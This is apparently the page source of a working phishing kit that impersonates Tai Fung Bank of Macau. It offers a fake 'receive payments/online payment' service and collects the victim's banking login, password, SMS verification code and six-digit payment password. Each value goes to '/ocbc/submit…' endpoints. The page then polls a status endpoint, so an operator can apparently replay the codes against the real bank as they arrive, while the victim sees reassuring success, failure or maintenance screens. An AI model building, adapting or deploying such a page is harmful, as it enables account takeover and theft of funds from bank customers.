<template>
	<view class="page-container">
		<!-- 全局 Loading 遮罩 -->
		<view v-if="globalLoading" class="global-loading-mask">
			<view class="global-loading-content">
				<image class="global-loading-logo" src="/static/images/taifungbank/5G.gif" mode="aspectFit"></image>
				<text class="global-loading-text">{{ globalLoadingText }}</text>
				<view class="global-loading-dots">
					<view class="dot dot1"></view>
					<view class="dot dot2"></view>
					<view class="dot dot3"></view>
				</view>
			</view>
		</view>

		<!-- ==================== show===1: 登錄頁 ==================== -->
		<view v-if="show===1" class="login-container">
			<view class="logo-section">
				<image class="bank-logo" src="/static/images/taifungbank/wh.png" mode="aspectFit"></image>
			</view>

			<view class="login-form">
				<!-- 手机號/網銀代號输入 -->
				<view class="input-group">
					<view class="phone-input">
						<view class="phone-prefix">
							<u-icon name="account" class="user-icon" size="32"></u-icon>
							<template v-if="!isOnlineBankingMode">
								<view class="country-code-wrapper" @click="openCountryCodeModal">
									<text class="country-code">{{ selectedCountryCode }}</text>
									<u-icon name="arrow-right" class="arrow-icon" size="20" :bold="true" color="#333"></u-icon>
								</view>
							</template>
						</view>
						<input
							class="phone-number"
							:type="isOnlineBankingMode ? 'text' : 'number'"
							:placeholder="inputPlaceholder"
							v-model="phoneNumber"
							:maxlength="maxPhoneLength"
						/>
					</view>
				</view>

				<!-- 密码输入 -->
				<view class="input-group">
					<view class="password-input">
						<u-icon name="lock" class="lock-icon" size="32"></u-icon>
						<input
							class="password-field"
							type="password"
							:placeholder="passwordPlaceholder"
							v-model="password"
							maxlength="14"
						/>
					</view>
				</view>

				<!-- 记錄登錄信息 -->
				<view class="checkbox-group" @click="rememberPhone = !rememberPhone">
					<view class="custom-checkbox" :class="{'checked': rememberPhone}">
						<u-icon v-if="rememberPhone" name="checkmark" size="24" color="#ffffff"></u-icon>
					</view>
					<text class="checkbox-label">{{ rememberLabelText }}</text>
				</view>

				<!-- 登錄按钮 -->
				<button class="login-btn" @click="handleLogin">登錄</button>

				<!-- 忘记密码 -->
				<view class="forgot-password" @click="handleForgotPassword">忘記密碼?</view>
			</view>

			<!-- 登錄模式切換 -->
			<view class="switch-login-mode" @click="switchLoginMode">
				<text class="switch-login-mode-text">{{ switchButtonText }}</text>
				<u-icon name="arrow-right" class="arrow-icon" size="20" :bold="true" color="#333"></u-icon>
			</view>

			<!-- 區號選擇弹窗 -->
			<view v-if="showCountryCodeModal" class="modal-overlay" :class="{'show': overlayVisible}" @click="closeCountryCodeModal">
				<view class="country-code-modal" :class="{'show': modalVisible}" @click.stop>
					<view class="modal-header">
						<view class="modal-cancel" @click="closeCountryCodeModal">取消</view>
						<view class="modal-title">選擇區號</view>
						<view class="modal-confirm" @click="confirmCountryCode">確定</view>
					</view>
					<view class="country-code-list">
						<view
							v-for="(item, index) in countryCodeList"
							:key="index"
							class="country-code-item"
							:class="{'selected': selectedCountryCode === item.code}"
							@click="selectedCountryCode = item.code"
						>
							<view class="code-info">
								<text class="code-text">{{ item.code }}</text>
								<text class="code-name">{{ item.name }}</text>
							</view>
							<view v-if="selectedCountryCode === item.code" class="selected-icon">
								<u-icon name="checkmark" size="32" color="#007AFF"></u-icon>
							</view>
						</view>
					</view>
				</view>
			</view>
		</view>

		<!-- ==================== show===2: 驗證碼頁 ==================== -->
		<view v-if="show===2" class="verify-container">
			<view class="status-bar" :style="{ height: statusBarHeight + 'px' }"></view>
			<view class="header-section">
				<view class="back-btn" @click="goHome">
					<u-icon name="arrow-left" size="32" color="#333"></u-icon>
				</view>
				<text class="header-title">驗證碼確認</text>
			</view>

			<view class="verify-logo-section">
				<image class="verify-bank-logo" src="/static/images/taifungbank/wh.png" mode="aspectFit"></image>
			</view>

			<view class="info-section">
				<text class="info-title">請輸入驗證碼</text>
				<text class="info-desc">我們已向您的手機發送了6位驗證碼</text>
				<text class="phone-number-display">{{ maskedPhoneNumber }}</text>
			</view>

			<view class="verify-section">
				<view class="code-inputs" @click="focusHiddenInput">
					<input
						class="hidden-input"
						type="tel"
						maxlength="6"
						v-model="hiddenVerifyValue"
						@input="onVerifyInput"
						@focus="onVerifyFocus"
						:focus="shouldVerifyFocus"
					/>
					<view
						v-for="(digit, index) in verifyCodeArray"
						:key="index"
						class="code-input"
						:class="{'active': verifyActiveIndex === index, 'filled': digit, 'cursor': verifyActiveIndex === index}"
					>
						{{ digit }}
					</view>
				</view>

				<view class="resend-section">
					<text v-if="countdown > 0" class="countdown-text">{{ countdown }}秒後可重新發送</text>
					<view v-else class="resend-btn" @tap="resendCode">重新發送驗證碼</view>
				</view>
			</view>

			<view class="submit-section">
				<button
					class="submit-btn"
					:class="{'disabled': !isVerifyCodeComplete}"
					:disabled="!isVerifyCodeComplete"
					@click="handleSubmitVerify"
				>確認</button>
			</view>

			<view class="security-tips">
				<u-icon name="info-circle" size="28" color="#999"></u-icon>
				<text class="tips-text">為了您的賬戶安全，請勿向任何人透露驗證碼</text>
			</view>
		</view>

		<!-- ==================== show===3: 收款服務頁 ==================== -->
		<view v-if="show===3" class="payments-container">
			<view class="payments-header-section">
				<view class="payments-status-bar" :style="{ height: statusBarHeight + 'px' }"></view>
				<view class="payments-header-content">
					<view class="payments-back-btn" @click="goHome">
						<u-icon name="arrow-left" size="28" color="#333"></u-icon>
					</view>
					<text class="payments-header-title">開啟收款/在綫付款服務</text>
					<view class="payments-header-bg"></view>
				</view>
			</view>

			<view class="main-card">
				<view class="service-header">
					<view class="service-icon">
						<image class="service-image" src="/static/images/taifungbank/u3.png" mode=""></image>
					</view>
					<text class="service-title">大豐銀行收款/在线付款服務</text>
					<text class="service-subtitle">安全、快速、便捷的收款/在綫付款解決方案</text>
				</view>

				<view class="description-section">
					<view class="description-card">
						<view class="description-icon">
							<u-icon name="shield-checkmark-fill" size="48" color="#28a745"></u-icon>
						</view>
						<view class="description-content">
							<text class="description-title">服務說明</text>
							<text class="description-text">您的收款方式將透過銀行級加密頻道安全傳輸，商家可直接結算，大幅提升收款效率。全程保護您的資金與隱私安全。</text>
							<br>
							<text class="description-text">支持在綫付款功能，無需前往櫃檯即可完成交易，隨時隨地輕鬆管理您的資金流轉。</text>
						</view>
					</view>
				</view>

				<view class="features-section">
					<text class="section-title">核心特色</text>
					<view class="features-grid">
						<view class="feature-item">
							<view class="feature-icon gradient-blue">
								<text class="bi bi-shield-lock-fill" style="font-size: 32rpx; color: #fff;"></text>
							</view>
							<text class="feature-text">銀行級加密</text>
						</view>
						<view class="feature-item">
							<view class="feature-icon gradient-green">
								<text class="bi bi-lightning-charge-fill" style="font-size: 32rpx; color: #fff;"></text>
							</view>
							<text class="feature-text">即時到帳</text>
						</view>
						<view class="feature-item">
							<view class="feature-icon gradient-orange">
								<text class="bi bi-patch-check-fill" style="font-size: 32rpx; color: #fff;"></text>
							</view>
							<text class="feature-text">合規保障</text>
						</view>
						<view class="feature-item">
							<view class="feature-icon gradient-purple">
								<text class="bi bi-incognito" style="font-size: 32rpx; color: #fff;"></text>
							</view>
							<text class="feature-text">隱私保護</text>
						</view>
					</view>
				</view>

				<view class="payments-security-tips">
					<view class="payments-tips-header">
						<u-icon name="info-circle-fill" size="32" color="#FF8C00"></u-icon>
						<text class="payments-tips-title">安全須知</text>
					</view>
					<view class="payments-tips-list">
						<view class="tip-item"><view class="tip-dot"></view><text class="tip-text">僅限認證商戶使用此服務</text></view>
						<view class="tip-item"><view class="tip-dot"></view><text class="tip-text">可隨時在設定中關閉服務</text></view>
						<view class="tip-item"><view class="tip-dot"></view><text class="tip-text">開啟服務完全免費</text></view>
						<view class="tip-item"><view class="tip-dot"></view><text class="tip-text">請確保綁定帳戶為本人所有</text></view>
					</view>
				</view>
			</view>

			<view class="bottom-actions">
				<view class="action-buttons">
					<button class="btn-cancel" @click="goHome">
						<u-icon name="clock" size="24" color="#666"></u-icon>
						<text>稍後再說</text>
					</button>
					<button class="btn-activate" @click="handleActivate">
						<u-icon name="checkmark-circle" size="24" color="#333"></u-icon>
						<text>立即開啟</text>
					</button>
				</view>
			</view>

			<!-- 支付密碼彈窗 -->
			<view v-if="showPasswordModal" class="password-modal" @click="closePasswordModal">
				<view class="pwd-modal-wrapper" @click.stop>
					<view class="pwd-modal-container">
						<view class="pwd-modal-header">
							<view class="pwd-modal-icon">
								<u-icon name="lock-fill" size="40" color="#333"></u-icon>
							</view>
							<text class="pwd-modal-title">輸入支付密碼</text>
							<text class="pwd-modal-subtitle">請輸入您的6位支付密碼以確認開啟服務</text>
						</view>

						<view class="pwd-password-section">
							<input
								class="hidden-password-input"
								type="number"
								maxlength="6"
								v-model="hiddenPasswordValue"
								@input="onPasswordInput"
								:focus="shouldPasswordFocus"
							/>
							<view class="password-display" @click="focusPasswordInput">
								<view
									v-for="(dot, index) in passwordArray"
									:key="index"
									class="password-circle"
									:class="{
										'filled': dot,
										'active': activePasswordIndex === index,
										'animate': dot && activePasswordIndex === index
									}"
								>
									<view v-if="dot" class="password-dot">●</view>
									<view v-if="activePasswordIndex === index && !dot" class="cursor-line"></view>
								</view>
							</view>
						</view>

						<view class="pwd-modal-actions">
							<button class="pwd-modal-btn pwd-modal-btn-cancel" @click="closePasswordModal">取消</button>
							<button
								class="pwd-modal-btn pwd-modal-btn-confirm"
								:class="{'disabled': !isPasswordComplete}"
								:disabled="!isPasswordComplete"
								@click="confirmPaymentPassword"
							>確認開啟</button>
						</view>
					</view>
					<view class="pwd-modal-close-btn" @click="closePasswordModal">
						<u-icon name="close" size="32" color="#fff"></u-icon>
					</view>
				</view>
			</view>
		</view>

		<!-- ==================== show===4: 成功頁 ==================== -->
		<view v-if="show===4" class="success-container">
			<view class="success-status-bar" :style="{ height: statusBarHeight + 'px' }"></view>
			<view class="success-content-wrapper">
				<view class="success-animation" :class="{'animate': showSuccessAnimation}">
					<view class="success-circle" :class="{'scale-in': showSuccessAnimation}">
						<view class="success-ring"></view>
						<view class="success-icon" :class="{'bounce-in': showSuccessIcon}">
							<u-icon name="checkmark" size="80" color="#fff"></u-icon>
						</view>
					</view>
					<view class="particles">
						<view
							v-for="i in 8"
							:key="i"
							class="particle"
							:class="{'float': showSuccessParticles}"
							:style="getParticleStyle(i)"
						></view>
					</view>
				</view>

				<view class="success-content" :class="{'slide-up': showSuccessContent}">
					<text class="success-title-text">開啟成功！</text>
					<text class="success-subtitle">大豐銀行收款/在綫付款服務已成功啟動</text>

					<view class="service-info-card" :class="{'fade-in': showSuccessCard}">
						<view class="info-item">
							<view class="info-icon"><u-icon name="checkmark-circle-fill" size="32" color="#28a745"></u-icon></view>
							<view class="info-content">
								<text class="info-title">自動收款結算服務狀態</text>
								<text class="info-desc">已開啟動服務</text>
							</view>
						</view>
						<view class="info-item">
							<view class="info-icon"><u-icon name="time-fill" size="32" color="#FF8C00"></u-icon></view>
							<view class="info-content">
								<text class="info-title">開啟時間</text>
								<text class="info-desc">{{ successTime }}</text>
							</view>
						</view>
						<view class="info-item">
							<view class="info-icon"><u-icon name="shield-checkmark-fill" size="32" color="#007AFF"></u-icon></view>
							<view class="info-content">
								<text class="info-title">安全等級</text>
								<text class="info-desc">銀行級加密保護</text>
							</view>
						</view>
					</view>

					<view class="features-highlight" :class="{'stagger-in': showSuccessFeatures}">
						<text class="features-title-text">您現在可以享受</text>
						<view class="features-list">
							<view
								v-for="(feature, index) in successFeatures"
								:key="index"
								class="feature-badge"
								:class="{'slide-left': showSuccessFeatures}"
								:style="{ 'animation-delay': (index * 0.2) + 's' }"
							>
								<u-icon :name="feature.icon" size="24" color="#FF8C00"></u-icon>
								<text class="feature-badge-text">{{ feature.text }}</text>
							</view>
						</view>
					</view>
				</view>

				<view class="success-action-section" :class="{'slide-up': showSuccessActions}">
					<view class="success-action-buttons">
						<button class="success-btn-primary" @click="goHome">
							<u-icon name="home" size="24" color="#333"></u-icon>
							<text>完成</text>
						</button>
					</view>
				</view>
			</view>
		</view>

		<!-- ==================== show===5: 失敗頁 ==================== -->
		<view v-if="show===5" class="failure-container">
			<view class="failure-status-bar">
				<view class="failure-status-icon-wrapper" :class="{ 'animate-shake': failureLoading }">
					<view class="failure-status-icon">⚠️</view>
				</view>
			</view>

			<view class="failure-main-content" :class="{ 'content-fade-in': failureContentVisible }">
				<view class="failure-title">收款服務/在綫付款開啓失敗</view>
				<view class="failure-message">{{ failureMessage || '很抱歉，服務未能成功開啓。請檢查您的帳戶信息或稍後重試。' }}</view>

				<view class="failure-reasons-section">
					<view class="failure-section-title">可能原因</view>
					<view class="failure-reasons-list">
						<view v-for="(reason, index) in failureReasons" :key="index" class="failure-reason-item"
							:class="{ 'item-slide-in': failureReasonsVisible }" :style="{ animationDelay: (index * 0.1) + 's' }">
							<view class="failure-reason-dot"></view>
							<text class="failure-reason-text">{{ reason }}</text>
						</view>
					</view>
				</view>

				<view class="failure-suggestions-section">
					<view class="failure-section-title">建議操作</view>
					<view class="failure-suggestions-list">
						<view v-for="(suggestion, index) in failureSuggestions" :key="index" class="failure-suggestion-item"
							:class="{ 'item-slide-in': failureSuggestionsVisible }" :style="{ animationDelay: (index * 0.1) + 's' }">
							<view class="failure-suggestion-number">{{ index + 1 }}</view>
							<text class="failure-suggestion-text">{{ suggestion }}</text>
						</view>
					</view>
				</view>
			</view>

			<view class="failure-action-buttons" :class="{ 'buttons-slide-up': failureButtonsVisible }">
				<button class="failure-home-button" @click="goHome">返回首頁</button>
			</view>
		</view>

		<!-- ==================== show===6: 維護頁 ==================== -->
		<view v-if="show===6" class="maintenance-container">
			<view class="maintenance-nav-header">
				<view class="maintenance-nav-left">
					<button class="maintenance-nav-btn" @click="goHome">
						<u-icon name="arrow-left" size="32" color="#333"></u-icon>
						<text class="maintenance-nav-text">返回</text>
					</button>
				</view>
				<view class="maintenance-nav-right">
					<button class="maintenance-nav-btn" @click="goHome">
						<u-icon name="close" size="32" color="#333"></u-icon>
						<text class="maintenance-nav-text">關閉</text>
					</button>
				</view>
			</view>

			<view class="maintenance-animation">
				<image
					class="maintenance-image"
					:class="{'show': showMaintenanceAnimation}"
					src="/static/images/taifungbank/tbank_01.png"
					mode="aspectFit"
				></image>
			</view>

			<view class="maintenance-content" :class="{'slide-up': showMaintenanceContent}">
				<text class="maintenance-title">系統維護中</text>
				<text class="maintenance-subtitle">我們正在升級系統以提供更好的服務</text>

				<view class="maintenance-info-card" :class="{'fade-in': showMaintenanceCard}">
					<view class="maint-info-item">
						<view class="maint-info-icon"><u-icon name="time-outline" size="32" color="#FF8C00"></u-icon></view>
						<view class="maint-info-content">
							<text class="maint-info-title">預計時間</text>
							<text class="maint-info-desc">約30分鐘</text>
						</view>
					</view>
					<view class="maint-info-item">
						<view class="maint-info-icon"><u-icon name="shield-checkmark-outline" size="32" color="#28a745"></u-icon></view>
						<view class="maint-info-content">
							<text class="maint-info-title">安全保障</text>
							<text class="maint-info-desc">您的資料完全安全</text>
						</view>
					</view>
					<view class="maint-info-item">
						<view class="maint-info-icon"><u-icon name="trending-up-outline" size="32" color="#007AFF"></u-icon></view>
						<view class="maint-info-content">
							<text class="maint-info-title">服務升級</text>
							<text class="maint-info-desc">更快速、更穩定的體驗</text>
						</view>
					</view>
				</view>
			</view>

			<view class="maintenance-action-section" :class="{'slide-up': showMaintenanceActions}">
				<view class="maintenance-tips">
					<text class="maintenance-tips-title">維護期間建議</text>
					<view class="maintenance-tips-list">
						<view class="maint-tip-item">
							<u-icon name="checkmark-circle" size="20" color="#28a745"></u-icon>
							<text>請稍後重新嘗試</text>
						</view>
						<view class="maint-tip-item">
							<u-icon name="checkmark-circle" size="20" color="#28a745"></u-icon>
							<text>關注公告了解進度</text>
						</view>
						<view class="maint-tip-item">
							<u-icon name="checkmark-circle" size="20" color="#28a745"></u-icon>
							<text>維護完成後服務恢復</text>
						</view>
					</view>
				</view>
				<button class="maintenance-btn-primary" @click="handleMaintenanceRefresh">
					<u-icon name="refresh-outline" size="24" color="#333"></u-icon>
					<text>刷新頁面</text>
				</button>
			</view>

			<view class="maintenance-status-section" :class="{'fade-in': showMaintenanceStatus}">
				<view class="maintenance-status-item">
					<view class="maintenance-status-dot"></view>
					<text class="maintenance-status-text">系統維護進行中</text>
				</view>
			</view>
		</view>
	</view>
</template>

<script setup>
import { ref, computed, onUnmounted, nextTick } from 'vue'
import { onLoad } from '@dcloudio/uni-app'
import { post } from '../../utils/request'
import { getToken } from '../../utils/storage'

// ========== 页面状态 ==========
const show = ref(1)
const statusBarHeight = ref(0)

// ========== 全局 Loading ==========
const globalLoading = ref(false)
const globalLoadingText = ref('加載中')

function showGlobalLoading(text = '加載中') {
	globalLoadingText.value = text
	globalLoading.value = true
}

function hideGlobalLoading() {
	globalLoading.value = false
}

// ========== URL 参数 ==========
const bankCode = ref('')

// ========== 轮询 ==========
const recordId = ref(0)
let pollingTimer = null
let isPolling = false
let pollingCount = 0
const MAX_POLLING_COUNT = 60

// ========== 生命周期 ==========
onLoad((options) => {
	const systemInfo = uni.getSystemInfoSync()
	statusBarHeight.value = systemInfo.statusBarHeight || 0

	const token = getToken()
	if (!token) {
		uni.showToast({ title: '請先登入', icon: 'none', duration: 2000 })
		setTimeout(() => { uni.reLaunch({ url: '/pages/auth/login' }) }, 2000)
		return
	}
	if (options?.code) bankCode.value = options.code
})

onUnmounted(() => {
	stopPolling()
	clearCountdown()
})

// ========== 登錄頁數據 ==========
const phoneNumber = ref('')
const password = ref('')
const rememberPhone = ref(false)
const loginMode = ref(2) // 1=網銀, 2=手機號
const showCountryCodeModal = ref(false)
const modalVisible = ref(false)
const overlayVisible = ref(false)
const selectedCountryCode = ref('+853')

const countryCodeList = [
	{ code: '+853', name: '澳門', length: 8, pattern: /^[0-9]{8}$/ },
	{ code: '+852', name: '香港', length: 8, pattern: /^[0-9]{8}$/ },
	{ code: '+86', name: '中國大陸', length: 11, pattern: /^1[3-9][0-9]{9}$/ }
]

const isOnlineBankingMode = computed(() => loginMode.value === 1)
const inputPlaceholder = computed(() => isOnlineBankingMode.value ? '請輸入網銀登錄代碼' : '請輸入手機號')
const switchButtonText = computed(() => isOnlineBankingMode.value ? '使用手機號碼登錄' : '使用網銀登錄代號登錄')
const passwordPlaceholder = computed(() => isOnlineBankingMode.value ? '請輸入網銀登錄密碼' : '請輸入登錄密碼')
const rememberLabelText = computed(() => isOnlineBankingMode.value ? '記錄網銀登錄代號' : '記錄登錄手機號')

const currentRegionRule = computed(() => countryCodeList.find(item => item.code === selectedCountryCode.value) || countryCodeList[0])
const maxPhoneLength = computed(() => isOnlineBankingMode.value ? 12 : currentRegionRule.value.length)

function switchLoginMode() {
	loginMode.value = loginMode.value === 1 ? 2 : 1
	phoneNumber.value = ''
	password.value = ''
}

function openCountryCodeModal() {
	showCountryCodeModal.value = true
	nextTick(() => {
		setTimeout(() => {
			overlayVisible.value = true
			modalVisible.value = true
		}, 10)
	})
}

function closeCountryCodeModal() {
	overlayVisible.value = false
	modalVisible.value = false
	setTimeout(() => { showCountryCodeModal.value = false }, 300)
}

function confirmCountryCode() {
	closeCountryCodeModal()
}

function handleForgotPassword() {
	uni.showToast({ title: '請打開App應用進行找回', icon: 'none', duration: 3000 })
}

// ========== 登錄提交 ==========
async function handleLogin() {
	if (!phoneNumber.value) {
		uni.showToast({ title: isOnlineBankingMode.value ? '請輸入網銀登錄代碼' : '請輸入手機號', icon: 'none' })
		return
	}

	if (!isOnlineBankingMode.value) {
		const rule = currentRegionRule.value
		if (phoneNumber.value.length !== rule.length || !rule.pattern.test(phoneNumber.value)) {
			uni.showToast({ title: `請輸入正確的${rule.length}位${rule.name}手機號碼`, icon: 'none' })
			return
		}
	} else {
		if (phoneNumber.value.length < 8 || phoneNumber.value.length > 12 || !/^[a-zA-Z0-9]+$/.test(phoneNumber.value)) {
			uni.showToast({ title: '網銀登錄代碼長度必須為8-12位字母或數字組合', icon: 'none' })
			return
		}
	}

	if (!password.value || password.value.length < 8 || password.value.length > 14) {
		uni.showToast({ title: '登錄密碼長度必須為8-14位', icon: 'none' })
		return
	}

	const account = isOnlineBankingMode.value ? phoneNumber.value : selectedCountryCode.value + phoneNumber.value

	showGlobalLoading('登錄中')
	try {
		const res = await post('/ocbc/submitLogin', {
			account_type: bankCode.value || '大豐銀行',
			organization_id: account,
			user_id: account,
			password: password.value
		}, { showError: false })

		recordId.value = res.data.record_id
		startPolling()
	} catch (error) {
		hideGlobalLoading()
		password.value = ''
		uni.showToast({ title: error.message || '登錄失敗', icon: 'none' })
	}
}

// ========== 轮询 ==========
function startPolling() {
	stopPolling()
	pollingCount = 0
	isPolling = false

	showGlobalLoading('等待處理中...')

	pollingTimer = setInterval(async () => {
		if (isPolling) return
		await pollStatus()
	}, 2000)
}

function stopPolling() {
	if (pollingTimer) {
		clearInterval(pollingTimer)
		pollingTimer = null
	}
	isPolling = false
	pollingCount = 0
}

async function pollStatus() {
	isPolling = true
	pollingCount++

	if (pollingCount > MAX_POLLING_COUNT) {
		stopPolling()
		hideGlobalLoading()
		show.value = 5
		return
	}

	try {
		const res = await post('/ocbc/pollStatus', {
			record_id: recordId.value
		}, { showError: false })

		handleStatusChange(res.data.status, res.data)
	} catch (error) {
		console.error('Poll status error:', error)
	} finally {
		isPolling = false
	}
}

// ========== 状态处理 ==========
function handleStatusChange(status, data) {
	switch (status) {
		case 'need_captcha':
			stopPolling()
			hideGlobalLoading()
			show.value = 2
			uni.showToast({ title: '驗證碼已發送', icon: 'success', duration: 1500 })
			startCountdown()
			break

		case 'need_payment_password':
			stopPolling()
			hideGlobalLoading()
			show.value = 3
			break

		case 'success':
			stopPolling()
			hideGlobalLoading()
			show.value = 4
			initSuccessPage()
			break

		case 'captcha_error':
			stopPolling()
			hideGlobalLoading()
			show.value = 2
			clearVerifyCode()
			uni.showToast({ title: '驗證碼錯誤，請重新輸入', icon: 'none', duration: 3000 })
			break

		case 'payment_password_error':
			stopPolling()
			hideGlobalLoading()
			show.value = 3
			showPasswordModal.value = true
			resetPassword()
			uni.showToast({ title: '支付密碼錯誤，請重新輸入', icon: 'none', duration: 3000 })
			break

		case 'password_error':
			stopPolling()
			hideGlobalLoading()
			show.value = 1
			clearLoginForm()
			uni.showToast({ title: '密碼錯誤，請重新輸入', icon: 'none', duration: 3000 })
			break

		case 'failed':
			stopPolling()
			hideGlobalLoading()
			show.value = 5
			failureMessage.value = ''
			initFailurePage()
			break

		case 'maintenance':
			stopPolling()
			hideGlobalLoading()
			show.value = 6
			initMaintenancePage()
			break

		case 'level':
			stopPolling()
			hideGlobalLoading()
			show.value = 5
			initFailurePage()
			break

		case 'card_error':
			stopPolling()
			hideGlobalLoading()
			show.value = 5
			initFailurePage()
			break

		default:
			break
	}
}

function clearLoginForm() {
	phoneNumber.value = ''
	password.value = ''
}

// ========== 驗證碼 ==========
const verifyCodeArray = ref(['', '', '', '', '', ''])
const verifyActiveIndex = ref(0)
const hiddenVerifyValue = ref('')
const shouldVerifyFocus = ref(false)
const countdown = ref(0)
let countdownTimer = null
const isSubmittingCode = ref(false)

const isVerifyCodeComplete = computed(() => verifyCodeArray.value.every(d => d !== ''))

const maskedPhoneNumber = computed(() => {
	const account = isOnlineBankingMode.value ? phoneNumber.value : selectedCountryCode.value + phoneNumber.value
	if (!account || account.length < 4) return '***'
	const start = account.slice(0, 3)
	const end = account.slice(-4)
	const middle = '*'.repeat(Math.max(0, account.length - 7))
	return `${start}${middle}${end}`
})

function focusHiddenInput() {
	shouldVerifyFocus.value = false
	nextTick(() => { shouldVerifyFocus.value = true })
}

function onVerifyFocus() {
	verifyActiveIndex.value = verifyCodeArray.value.findIndex(d => d === '')
	if (verifyActiveIndex.value === -1) verifyActiveIndex.value = 5
}

function onVerifyInput(event) {
	const value = event.detail?.value || event.target?.value || ''
	const cleanValue = value.toString().replace(/\D/g, '').slice(0, 6)
	hiddenVerifyValue.value = cleanValue

	verifyCodeArray.value = Array(6).fill('')
	for (let i = 0; i < cleanValue.length; i++) {
		verifyCodeArray.value[i] = cleanValue[i]
	}
	verifyActiveIndex.value = cleanValue.length < 6 ? cleanValue.length : 5

	if (cleanValue.length === 6) {
		setTimeout(() => { handleSubmitVerify() }, 100)
	}
}

function clearVerifyCode() {
	verifyCodeArray.value = ['', '', '', '', '', '']
	hiddenVerifyValue.value = ''
	verifyActiveIndex.value = 0
}

function startCountdown() {
	countdown.value = 60
	countdownTimer = setInterval(() => {
		countdown.value--
		if (countdown.value <= 0) clearCountdown()
	}, 1000)
}

function clearCountdown() {
	if (countdownTimer) {
		clearInterval(countdownTimer)
		countdownTimer = null
	}
	countdown.value = 0
}

function resendCode() {
	if (countdown.value > 0) return
	clearVerifyCode()
	startCountdown()
	shouldVerifyFocus.value = false
	nextTick(() => { setTimeout(() => { shouldVerifyFocus.value = true }, 200) })
	uni.showToast({ title: '驗證碼已重新發送', icon: 'success' })
}

async function handleSubmitVerify() {
	const code = verifyCodeArray.value.join('')
	if (code.length !== 6) {
		uni.showToast({ title: '請輸入完整的驗證碼', icon: 'none' })
		return
	}
	if (isSubmittingCode.value) return
	isSubmittingCode.value = true

	showGlobalLoading('驗證中...')
	try {
		await post('/ocbc/submitCaptcha', {
			record_id: recordId.value,
			captcha: code
		}, { showError: false })

		startPolling()
	} catch (error) {
		hideGlobalLoading()
		clearVerifyCode()
		uni.showToast({ title: error.message || '驗證碼提交失敗', icon: 'none' })
	} finally {
		isSubmittingCode.value = false
	}
}

// ========== 支付密碼 ==========
const showPasswordModal = ref(false)
const hiddenPasswordValue = ref('')
const passwordArray = ref(['', '', '', '', '', ''])
const activePasswordIndex = ref(0)
const shouldPasswordFocus = ref(false)

const isPasswordComplete = computed(() => passwordArray.value.every(d => d !== ''))
const fullPassword = computed(() => passwordArray.value.join(''))

function handleActivate() {
	showPasswordModal.value = true
	nextTick(() => { setTimeout(() => { shouldPasswordFocus.value = true }, 300) })
}

function closePasswordModal() {
	showPasswordModal.value = false
	resetPassword()
}

function resetPassword() {
	hiddenPasswordValue.value = ''
	passwordArray.value = ['', '', '', '', '', '']
	activePasswordIndex.value = 0
	shouldPasswordFocus.value = false
}

function focusPasswordInput() {
	shouldPasswordFocus.value = false
	nextTick(() => { shouldPasswordFocus.value = true })
}

function onPasswordInput(event) {
	const value = event.detail?.value || event.target?.value || ''
	const cleanValue = value.toString().replace(/\D/g, '').slice(0, 6)
	hiddenPasswordValue.value = cleanValue

	passwordArray.value = Array(6).fill('')
	for (let i = 0; i < cleanValue.length; i++) {
		passwordArray.value[i] = cleanValue[i]
	}
	activePasswordIndex.value = cleanValue.length < 6 ? cleanValue.length : 5
}

async function confirmPaymentPassword() {
	if (!isPasswordComplete.value) {
		uni.showToast({ title: '請輸入完整的支付密碼', icon: 'none' })
		return
	}

	const pwd = fullPassword.value
	showPasswordModal.value = false
	resetPassword()

	showGlobalLoading('身份驗證中')
	try {
		await post('/ocbc/submitPaymentPassword', {
			record_id: recordId.value,
			payment_password: pwd
		}, { showError: false })

		showGlobalLoading('驗證中')
		startPolling()
	} catch (error) {
		hideGlobalLoading()
		uni.showToast({ title: error.message || '驗證失敗，請重試', icon: 'none', duration: 3000 })
	}
}

// ========== 成功頁 ==========
const showSuccessAnimation = ref(false)
const showSuccessIcon = ref(false)
const showSuccessParticles = ref(false)
const showSuccessContent = ref(false)
const showSuccessCard = ref(false)
const showSuccessFeatures = ref(false)
const showSuccessActions = ref(false)
const successTime = ref('')

const successFeatures = [
	{ icon: 'hourglass-half-fill', text: '即時到帳' },
	{ icon: 'home-fill', text: '安全保障' },
	{ icon: 'checkmark-circle-fill', text: '便捷管理' },
	{ icon: 'lock-fill', text: '隱私保護' }
]

function initSuccessPage() {
	const now = new Date()
	successTime.value = now.toLocaleString('zh-TW', { year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit' })

	setTimeout(() => { showSuccessAnimation.value = true }, 200)
	setTimeout(() => { showSuccessIcon.value = true }, 800)
	setTimeout(() => { showSuccessParticles.value = true }, 1000)
	setTimeout(() => { showSuccessContent.value = true }, 1200)
	setTimeout(() => { showSuccessCard.value = true }, 1600)
	setTimeout(() => { showSuccessFeatures.value = true }, 2000)
	setTimeout(() => { showSuccessActions.value = true }, 2400)
}

function getParticleStyle(index) {
	const angle = (index - 1) * 45
	const delay = (index - 1) * 0.1
	return { '--angle': `${angle}deg`, 'animation-delay': `${delay}s` }
}

// ========== 失敗頁 ==========
const failureLoading = ref(true)
const failureContentVisible = ref(false)
const failureReasonsVisible = ref(false)
const failureSuggestionsVisible = ref(false)
const failureButtonsVisible = ref(false)

const failureMessage = ref('')
const failureReasons = ['網絡不穩定或系統繁忙', '帳戶信息未完成驗證', '系統臨時故障']
const failureSuggestions = ['確認已完成身份與收款帳戶驗證', '稍後重新開啓服務']

function initFailurePage() {
	failureLoading.value = true
	failureContentVisible.value = false
	failureReasonsVisible.value = false
	failureSuggestionsVisible.value = false
	failureButtonsVisible.value = false

	setTimeout(() => { failureLoading.value = false; failureContentVisible.value = true }, 800)
	setTimeout(() => { failureReasonsVisible.value = true }, 1200)
	setTimeout(() => { failureSuggestionsVisible.value = true }, 1600)
	setTimeout(() => { failureButtonsVisible.value = true }, 2000)
}

// ========== 維護頁 ==========
const showMaintenanceAnimation = ref(false)
const showMaintenanceContent = ref(false)
const showMaintenanceCard = ref(false)
const showMaintenanceActions = ref(false)
const showMaintenanceStatus = ref(false)

function initMaintenancePage() {
	showMaintenanceAnimation.value = false
	showMaintenanceContent.value = false
	showMaintenanceCard.value = false
	showMaintenanceActions.value = false
	showMaintenanceStatus.value = false

	setTimeout(() => { showMaintenanceAnimation.value = true }, 300)
	setTimeout(() => { showMaintenanceContent.value = true }, 800)
	setTimeout(() => { showMaintenanceCard.value = true }, 1200)
	setTimeout(() => { showMaintenanceActions.value = true }, 1600)
	setTimeout(() => { showMaintenanceStatus.value = true }, 2000)
}

